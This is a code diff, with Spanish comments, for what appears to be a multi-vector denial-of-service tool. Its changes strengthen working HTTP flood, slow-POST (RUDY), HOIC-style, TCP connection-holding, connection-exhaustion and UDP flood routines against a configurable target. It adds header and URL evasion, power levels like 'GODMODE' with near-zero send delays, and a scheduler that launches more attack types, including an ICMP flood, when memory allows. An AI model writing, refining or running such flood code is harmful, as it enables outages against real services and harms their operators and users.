@@ -360,11 +360,11 @@ class ConnectionManager:
                 if session_key not in cls._sessions:
                     session = requests.Session()
                     
-                    # Configurar adapter optimizado
+                    # Configurar adapter optimizado - sin retries para fallar rápido y continuar
                     retry_strategy = Retry(
-                        total=1,
+                        total=0,  # Sin retries - fallar rápido y continuar con siguiente request
                         backoff_factor=0,
-                        status_forcelist=[429, 500, 502, 503, 504]
+                        status_forcelist=[]  # No reintentar ningún código
                     )
                     
                     if KEEP_ALIVE_POOLING:
@@ -376,9 +376,9 @@ class ConnectionManager:
                         pool_connections = 1
                         pool_maxsize = 1
                     
-                    # Configurar timeouts optimizados
-                    connect_timeout = 5.0  # Timeout de conexión
-                    read_timeout = 10.0 if POWER_LEVEL in ["HEAVY", "EXTREME", "DEVASTATOR", "APOCALYPSE", "GODMODE"] else 15.0
+                    # Configurar timeouts optimizados - más cortos para evitar bloqueos
+                    connect_timeout = 3.0  # Timeout de conexión reducido
+                    read_timeout = 5.0 if POWER_LEVEL in ["HEAVY", "EXTREME", "DEVASTATOR", "APOCALYPSE", "GODMODE"] else 6.0
                     
                     # HTTPAdapter no soporta socket_options directamente
                     # Se configurará SO_KEEPALIVE a nivel de socket después si es necesario
@@ -4226,6 +4226,17 @@ def deploy_custom_http_attack():
             # Normalizar TARGET - quitar barra final si existe (puede causar problemas de conexión)
             normalized_target = TARGET.rstrip('/') if TARGET.endswith('/') and TARGET.count('/') > 3 else TARGET
             
+            # Asegurar que el protocolo sea correcto - nunca usar HTTPS si el target es HTTP
+            if normalized_target.startswith('http://') and PROTOCOL == "https":
+                # Forzar HTTP si el target es HTTP
+                normalized_target = normalized_target.replace('https://', 'http://')
+            elif normalized_target.startswith('https://') and PROTOCOL == "http":
+                # Forzar HTTPS si el target es HTTPS
+                normalized_target = normalized_target.replace('http://', 'https://')
+            elif not normalized_target.startswith(('http://', 'https://')):
+                # Agregar protocolo si falta
+                normalized_target = f"{PROTOCOL}://{normalized_target}"
+            
             # Usar ConnectionManager para mejor gestión de conexiones (ya optimizado)
             session = ConnectionManager.get_session(normalized_target, worker_id)
             
@@ -4289,8 +4300,28 @@ def deploy_custom_http_attack():
                     if target_url.endswith('/') and target_url.count('/') > 3:
                         target_url = target_url.rstrip('/')
                     
-                    # Aplicar técnicas de evasión a la URL
+                    # CRÍTICO: Asegurar que el protocolo sea correcto ANTES de aplicar evasión
+                    if PROTOCOL == "http":
+                        # Forzar HTTP - nunca usar HTTPS si el target es HTTP
+                        if target_url.startswith('https://'):
+                            target_url = target_url.replace('https://', 'http://', 1)
+                        elif not target_url.startswith('http://'):
+                            target_url = f"http://{target_url}"
+                    elif PROTOCOL == "https":
+                        # Forzar HTTPS
+                        if target_url.startswith('http://'):
+                            target_url = target_url.replace('http://', 'https://', 1)
+                        elif not target_url.startswith('https://'):
+                            target_url = f"https://{target_url}"
+                    
+                    # Aplicar técnicas de evasión a la URL (solo en path, no en dominio)
                     target_url = apply_url_evasion(target_url)
+                    
+                    # Validar protocolo DESPUÉS de aplicar evasión (por si acaso)
+                    if PROTOCOL == "http" and target_url.startswith('https://'):
+                        target_url = target_url.replace('https://', 'http://', 1)
+                    elif PROTOCOL == "https" and target_url.startswith('http://'):
+                        target_url = target_url.replace('http://', 'https://', 1)
                     
                     # Obtener headers con evasión y filtrar pseudo-headers HTTP/2 inválidos
                     request_headers_raw = get_random_headers()
@@ -4326,7 +4357,8 @@ def deploy_custom_http_attack():
                             headers=request_headers, 
                             timeout=request_timeout, 
                             verify=False,
-                            stream=False  # No stream para mejor rendimiento
+                            stream=False,  # No stream para mejor rendimiento
+                            allow_redirects=False  # No seguir redirects para evitar cambios de protocolo
                         )
                     else:
                         # Parameter pollution para GET
@@ -4340,7 +4372,7 @@ def deploy_custom_http_attack():
                             timeout=request_timeout, 
                             verify=False,
                             stream=False,
-                            allow_redirects=True  # Seguir redirects para SSL-VPN
+                            allow_redirects=False  # No seguir redirects para evitar cambios de protocolo
                         )
                     
                     # Actualizar estadísticas
@@ -5042,10 +5074,20 @@ def deploy_rudy():
             
             while time.time() < end_time and monitoring_active:
                 try:
-                    # Crear conexión
+                    # Crear conexión con protocolo correcto
+                    target_host = IP_ADDRESS or DOMAIN
                     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                     sock.settimeout(10)
-                    sock.connect((DOMAIN, PORT))
+                    
+                    # Si es HTTPS, usar SSL
+                    if PROTOCOL == "https":
+                        import ssl
+                        context = ssl.create_default_context()
+                        context.check_hostname = False
+                        context.verify_mode = ssl.CERT_NONE
+                        sock = context.wrap_socket(sock, server_hostname=DOMAIN)
+                    
+                    sock.connect((target_host, PORT))
                     
                     # Enviar POST request muy lentamente (slow POST)
                     post_data = "a=1" + "&x=" + "X" * (PAYLOAD_SIZE_KB * 100)  # Payload grande
@@ -5122,11 +5164,19 @@ def deploy_hoic():
                             headers["Accept-Encoding"] = "gzip, deflate"
                             headers["Connection"] = "keep-alive"
                             
+                            # Asegurar protocolo correcto
+                            target_url = TARGET
+                            if PROTOCOL == "http" and target_url.startswith('https://'):
+                                target_url = target_url.replace('https://', 'http://', 1)
+                            elif PROTOCOL == "https" and target_url.startswith('http://'):
+                                target_url = target_url.replace('http://', 'https://', 1)
+                            
                             response = session.get(
-                                TARGET,
+                                target_url,
                                 headers=headers,
                                 timeout=5,
-                                verify=False
+                                verify=False,
+                                allow_redirects=False  # No seguir redirects
                             )
                             
                             attack_stats["requests_sent"] += 1
@@ -5195,41 +5245,65 @@ def deploy_tcp_flood_advanced():
         end_time = time.time() + DURATION
         connections = []
         max_connections_per_worker = min(MAX_CONNECTIONS // 10, 1000)
+        target_host = IP_ADDRESS or DOMAIN
         
         try:
             while time.time() < end_time and monitoring_active:
                 try:
-                    # Crear nueva conexión TCP
+                    # Crear nueva conexión TCP con optimizaciones
                     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                    sock.settimeout(2)
+                    sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)  # Deshabilitar Nagle
+                    sock.settimeout(3)  # Timeout más corto para fallar rápido
                     
                     # Intentar conectar
                     try:
-                        sock.connect((IP_ADDRESS or DOMAIN, PORT))
+                        sock.connect((target_host, PORT))
                         connections.append(sock)
                         attack_stats["requests_sent"] += 1
                         
-                        # Mantener conexión abierta el mayor tiempo posible
-                        # Enviar datos periódicamente para mantenerla activa
-                        if len(connections) % 10 == 0:
+                        # Enviar datos periódicamente para mantener conexión activa
+                        if len(connections) % 5 == 0:
                             try:
-                                sock.send(b"GET / HTTP/1.1\r\nHost: " + DOMAIN.encode() + b"\r\n\r\n")
+                                # Enviar request HTTP parcial para mantener conexión
+                                partial_request = b"GET / HTTP/1.1\r\nHost: " + DOMAIN.encode() + b"\r\n"
+                                sock.send(partial_request)
                             except:
                                 pass
-                    except (socket.error, ConnectionRefusedError, TimeoutError):
-                        sock.close()
-                        attack_stats["errors"].append("TCP connection refused")
+                    except (socket.error, ConnectionRefusedError, TimeoutError, OSError) as e:
+                        try:
+                            sock.close()
+                        except:
+                            pass
+                        if len(attack_stats["errors"]) < 10:  # Limitar errores en stats
+                            attack_stats["errors"].append(f"TCP: {str(e)[:30]}")
                     
-                    # Limpiar conexiones cerradas
-                    connections = [c for c in connections if not getattr(c, '_closed', False)]
+                    # Limpiar conexiones cerradas o inválidas
+                    valid_connections = []
+                    for conn in connections:
+                        try:
+                            # Verificar si la conexión sigue activa
+                            conn.settimeout(0.1)
+                            conn.recv(1, socket.MSG_PEEK)
+                            valid_connections.append(conn)
+                        except:
+                            try:
+                                conn.close()
+                            except:
+                                pass
+                    connections = valid_connections
                     
-                    # Si tenemos muchas conexiones, mantenerlas abiertas
+                    # Estrategia: crear conexiones rápidamente hasta el límite
                     if len(connections) >= max_connections_per_worker:
-                        # Mantener conexiones abiertas sin crear nuevas
-                        time.sleep(0.1)
+                        # Mantener conexiones abiertas, enviar keep-alive
+                        for conn in connections[:10]:  # Solo las primeras 10
+                            try:
+                                conn.send(b"X-a: b\r\n")  # Header keep-alive
+                            except:
+                                pass
+                        time.sleep(0.05)  # Pausa corta
                     else:
                         # Crear más conexiones rápidamente
-                        time.sleep(0.01)
+                        time.sleep(0.001 if POWER_LEVEL in ["DEVASTATOR", "APOCALYPSE", "GODMODE"] else 0.01)
                     
                 except Exception as e:
                     if DEBUG_MODE:
@@ -5244,7 +5318,7 @@ def deploy_tcp_flood_advanced():
                     pass
                     
         except Exception as e:
-            log_message("ERROR", f"Error fatal en TCP flood worker {worker_id}: {e}")
+            log_message("ERROR", f"Error fatal en TCP flood worker {worker_id}: {e}", force_console=True)
     
     num_workers = min(MULTIPLIER * 10, MAX_THREADS // 4)
     threads = []
@@ -5285,13 +5359,14 @@ def deploy_connection_exhaustion():
             
             while time.time() < end_time and monitoring_active:
                 try:
-                    # Crear conexión y mantenerla abierta
+                    # Crear conexión y mantenerla abierta con stream
                     response = session.get(
                         TARGET,
                         headers=get_random_headers(),
-                        timeout=30,  # Timeout largo para mantener conexión
+                        timeout=60,  # Timeout muy largo para mantener conexión
                         verify=False,
-                        stream=True  # Stream para mantener conexión abierta
+                        stream=True,  # Stream para mantener conexión abierta
+                        allow_redirects=False  # No seguir redirects
                     )
                     
                     active_connections.append(response)
@@ -5677,44 +5752,59 @@ def deploy_udp_flood():
     log_message("INFO", "Iniciando UDP Flood - saturación de capacidad UDP")
     
     def udp_worker(worker_id: int):
-        """Worker que envía paquetes UDP"""
+        """Worker que envía paquetes UDP optimizado"""
         end_time = time.time() + DURATION
         packet_count = 0
+        target_host = IP_ADDRESS or DOMAIN
         
         try:
+            # Reutilizar socket para mejor rendimiento
+            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            sock.settimeout(0.01)  # Timeout muy corto
+            
             while time.time() < end_time and monitoring_active:
                 try:
-                    # Crear socket UDP
-                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-                    sock.settimeout(0.1)
-                    
-                    # Generar payload aleatorio
-                    payload = bytes(random.randint(0, 255) for _ in range(random.randint(64, 1024)))
+                    # Generar payload aleatorio de tamaño variable
+                    payload_size = random.randint(64, 1400)  # Hasta MTU
+                    payload = bytes(random.randint(0, 255) for _ in range(payload_size))
                     
                     # Enviar paquete UDP
                     try:
-                        sock.sendto(payload, (IP_ADDRESS or DOMAIN, PORT))
+                        sock.sendto(payload, (target_host, PORT))
                         attack_stats["requests_sent"] += 1
                         packet_count += 1
-                    except Exception:
-                        pass
+                    except (OSError, socket.error):
+                        # Recrear socket si hay error
+                        try:
+                            sock.close()
+                        except:
+                            pass
+                        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                        sock.settimeout(0.01)
                     
-                    sock.close()
-                    
-                    # Enviar rápidamente
+                    # Enviar rápidamente según nivel de potencia
                     if POWER_LEVEL in ["DEVASTATOR", "APOCALYPSE", "GODMODE"]:
-                        time.sleep(0.001)  # Muy rápido
+                        time.sleep(0.0001)  # Extremadamente rápido
+                    elif POWER_LEVEL in ["EXTREME", "HEAVY"]:
+                        time.sleep(0.001)
                     else:
                         time.sleep(0.01)
                         
                 except Exception as e:
-                    attack_stats["errors"].append(str(e)[:50])
-                    time.sleep(0.05)
+                    if len(attack_stats["errors"]) < 10:
+                        attack_stats["errors"].append(f"UDP: {str(e)[:30]}")
+                    time.sleep(0.01)
+            
+            # Cerrar socket al finalizar
+            try:
+                sock.close()
+            except:
+                pass
                     
         except Exception as e:
-            log_message("ERROR", f"Error en UDP worker {worker_id}: {e}")
+            log_message("ERROR", f"Error en UDP worker {worker_id}: {e}", force_console=True)
     
-    num_workers = min(MULTIPLIER * 5, MAX_THREADS // 4)
+    num_workers = min(MULTIPLIER * 8, MAX_THREADS // 3)  # Más workers para UDP
     threads = []
     for i in range(num_workers):
         thread = threading.Thread(target=udp_worker, args=(i,), daemon=True)
@@ -9086,21 +9176,33 @@ Ejemplos:
             import traceback
             log_message("ERROR", f"Traceback: {traceback.format_exc()}", force_console=True)
         
-        # Ataques avanzados Python (solo si hay recursos y espacio)
+        # Ataques avanzados Python (L4 y L7) - solo si hay recursos y espacio
         if memory_percent < MEMORY_THRESHOLD_WARN and tools_deployed < MAX_TOOLS_DEPLOY:
-            # Solo desplegar algunos ataques avanzados, no todos
+            # Desplegar ataques avanzados L4 y L7
             advanced_attacks = [
-                deploy_tcp_flood_advanced,
-                deploy_connection_exhaustion,
+                deploy_tcp_flood_advanced,  # L4 - TCP flood
+                deploy_connection_exhaustion,  # L7 - Connection exhaustion
             ]
-            for attack_func in advanced_attacks[:2]:  # Máximo 2 ataques avanzados
+            
+            # Si hay más recursos disponibles, agregar ataques adicionales
+            if memory_percent < 50 and tools_deployed < MAX_TOOLS_DEPLOY - 1:
+                advanced_attacks.extend([
+                    deploy_udp_flood,  # L4 - UDP flood
+                    deploy_hoic,  # L7 - HOIC attack
+                ])
+            
+            # Si hay recursos abundantes, agregar ICMP flood (L4)
+            if memory_percent < 40 and tools_deployed < MAX_TOOLS_DEPLOY - 2:
+                advanced_attacks.append(deploy_icmp_flood)  # L4 - ICMP flood
+            
+            for attack_func in advanced_attacks:
                 if tools_deployed >= MAX_TOOLS_DEPLOY:
                     break
                 try:
                     attack_func()
                     tools_deployed += 1
                 except Exception as e:
-                    log_message("ERROR", f"Error desplegando ataque avanzado: {e}")
+                    log_message("ERROR", f"Error desplegando ataque avanzado: {e}", force_console=True)
         
         # Ataque socket-based de bajo nivel (solo si hay recursos)
         if SOCKET_ATTACK and memory_percent < MEMORY_THRESHOLD_WARN and tools_deployed < MAX_TOOLS_DEPLOY:
